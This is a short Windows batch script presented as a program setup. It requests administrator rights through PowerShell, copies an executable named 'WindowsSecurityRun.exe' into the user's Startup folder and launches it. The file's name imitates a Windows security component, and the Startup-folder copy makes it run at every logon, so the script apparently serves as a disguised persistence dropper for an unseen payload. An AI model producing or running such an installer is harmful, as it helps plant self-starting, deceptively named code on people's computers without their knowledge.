@echo off
echo "[+] Setting Up Program!"
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

copy "%~dp0WindowsSecurityRun.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if %errorLevel% equ 0 (
    echo File copied successfully.
) else (
    echo Failed to copy the file.
    pause
)

start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityRun.exe"
if %errorLevel% equ 0 (
    echo Program started successfully.
) else (
    echo Failed to start the program.
    pause
)

